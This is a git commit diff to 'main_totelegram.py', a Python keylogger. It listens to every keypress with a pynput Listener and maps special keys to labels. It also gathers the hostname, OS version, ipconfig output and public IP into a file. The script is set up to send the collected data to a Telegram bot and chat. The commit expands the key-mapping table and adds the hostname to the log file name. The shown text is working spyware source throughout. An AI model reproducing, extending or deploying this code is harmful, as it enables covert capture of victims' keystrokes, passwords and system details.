7137e6fd209a69196fffc74dd31ce5594b34a743
Beamingface <101923825+dtsiken@users.noreply.github.com>
2024-05-07 08:53:00 +0800

    Update main_totelegram.py

--- main_totelegram.py
+++ main_totelegram.py
@@ -10,10 +10,11 @@ import telebot
 import os
 
 # Telegram bot token
-TOKEN = 'YOUR_TELEGRAM_TOKEN'
+TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'
 
 # Chat ID where you want to send the messages
 CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID'
+
 
 # Initialize Telegram bot
 bot = telebot.TeleBot(TOKEN)
@@ -38,7 +39,7 @@ def get_public_ip():
 
 def create_system_info():
     global date
-    date = time.strftime("%A, %B %d, %Y") + ".txt"
+    date = time.strftime("%A, %B %d, %Y") + f"_{socket.gethostname()}.txt"
     computer_name = f"\nComputer Name: {socket.gethostname()}\n"
     os_info = f"OS: {platform.system()} {platform.release()}\n"
     ipconfig_info = f"\n{subprocess.getoutput('ipconfig')}\n"
@@ -82,53 +83,119 @@ def OnKeyboardEvent(event):
     elif event == "Key.space":
         event = " "
     
+    elif event == "Key.alt":
+        event = " {ALT} "
+        
+    elif event == "Key.alt_gr":
+        event = " {ALT_GR} "
+        
+    elif event == "Key.alt_l":
+        event = " {ALT_L} "
+        
+    elif event == "Key.alt_r":
+        event = " {ALT_R} "
+        
     elif event == "Key.backspace":
         event = " {BACKSPACE} "
-
-    elif event == "Key.shift":
-        event = " {L.SHIFT} "
-
-    elif event == "Key.shift_r":
-        event = " {R.SHIFT} "
-
+        
     elif event == "Key.caps_lock":
-        event = " {CAPSLOCK} "
-
-    elif event == "Key.ctrl_l":
-        event = " {L.CTRL} "
-
-    elif event == "Key.ctrl_r":
-        event = " {R.CTRL} "
-
-    elif event == "Key.tab":
-        event = " {TAB} "
-
-    elif event == "Key.alt_l":
-        event = " {L.ALT} "
-
-    elif event == "Key.alt_gr":
-        event = " {R.ALT} "
-
-    elif event == "Key.up":
-        event = " {UP.KEY} "
-
-    elif event == "Key.left":
-        event = " {LEFT.KEY} "
-
-    elif event == "Key.down":
-        event = " {DOWN.KEY} "
-
-    elif event == "Key.right":
-        event = " {RIGHT.KEY} "
-
+        event = " {CAPS_LOCK} "
+        
     elif event == "Key.cmd":
-        event = " {L.WINKEY} "
-
+        event = " {CMD} "
+        
+    elif event == "Key.cmd_l":
+        event = " {CMD_L} "
+        
     elif event == "Key.cmd_r":
-        event = " {R.WINKEY} "
-
+        event = " {CMD_R} "
+        
+    elif event == "Key.ctrl":
+        event = " {CTRL} "
+        
+    elif event == "Key.ctrl_l":
+        event = " {CTRL_L} "
+        
+    elif event == "Key.ctrl_r":
+        event = " {CTRL_R} "
+        
+    elif event == "Key.delete":
+        event = " {DELETE} "
+        
+    elif event == "Key.down":
+        event = " {DOWN} "
+        
+    elif event == "Key.end":
+        event = " {END} "
+        
     elif event == "Key.esc":
         event = " {ESC} "
+        
+    elif event == "Key.home":
+        event = " {HOME} "
+        
+    elif event == "Key.insert":
+        event = " {INSERT} "
+        
+    elif event == "Key.left":
+        event = " {LEFT} "
+        
+    elif event == "Key.media_next":
+        event = " {MEDIA_NEXT} "
+        
+    elif event == "Key.media_play_pause":
+        event = " {MEDIA_PLAY_PAUSE} "
+        
+    elif event == "Key.media_previous":
+        event = " {MEDIA_PREVIOUS} "
+        
+    elif event == "Key.media_volume_down":
+        event = " {MEDIA_VOLUME_DOWN} "
+        
+    elif event == "Key.media_volume_mute":
+        event = " {MEDIA_VOLUME_MUTE} "
+        
+    elif event == "Key.media_volume_up":
+        event = " {MEDIA_VOLUME_UP} "
+        
+    elif event == "Key.menu":
+        event = " {MENU} "
+        
+    elif event == "Key.num_lock":
+        event = " {NUM_LOCK} "
+        
+    elif event == "Key.page_down":
+        event = " {PAGE_DOWN} "
+        
+    elif event == "Key.page_up":
+        event = " {PAGE_UP} "
+        
+    elif event == "Key.pause":
+        event = " {PAUSE} "
+        
+    elif event == "Key.print_screen":
+        event = " {PRINT_SCREEN} "
+        
+    elif event == "Key.right":
+        event = " {RIGHT} "
+        
+    elif event == "Key.scroll_lock":
+        event = " {SCROLL_LOCK} "
+        
+    elif event == "Key.shift":
+        event = " {SHIFT} "
+        
+    elif event == "Key.shift_l":
+        event = " {SHIFT_L} "
+        
+    elif event == "Key.shift_r":
+        event = " {SHIFT_R} "
+        
+    elif event == "Key.tab":
+        event = " {TAB} "
+        
+    elif event == "Key.up":
+        event = " {UP} "
 
     elif event == "Key.f1":
         event = " {F1} "
@@ -150,7 +217,7 @@ def OnKeyboardEvent(event):
 
     elif event == "Key.f7":
         event = " {F7} "
-
+        
     elif event == "Key.f8":
         event = " {F8} "
 
@@ -165,32 +232,6 @@ def OnKeyboardEvent(event):
 
     elif event == "Key.f12":
         event = " {F12} "
-
-    elif event == "Key.insert":
-        event = " {INSERT} "
-
-    elif event == "Key.delete":
-        event = " {DELETE} "
-
-    elif event == "Key.home":
-        event = " {HOME} "
-
-    elif event == "Key.page_up":
-        event = " {PAGE.UP} "
-
-    elif event == "Key.scroll_lock":
-        event = " {SCROLL.LOCK} "
-
-    elif event == "Key.pause":
-        event = " {PAUSE.BREAK} "
-
-    elif event == "Key.menu":
-        event = " {MENU} "
-
-    elif event == "Key.num_lock":
-        event = " {NUM.LOCK} "
-
-    # Handle other keyboard events similarly
 
     elif event.isalpha():
         if caps_lock_on:
@@ -222,4 +263,3 @@ create_system_info()
 # Start listening to keyboard events
 with Listener(on_press=OnKeyboardEvent) as listener:
     listener.join()
-
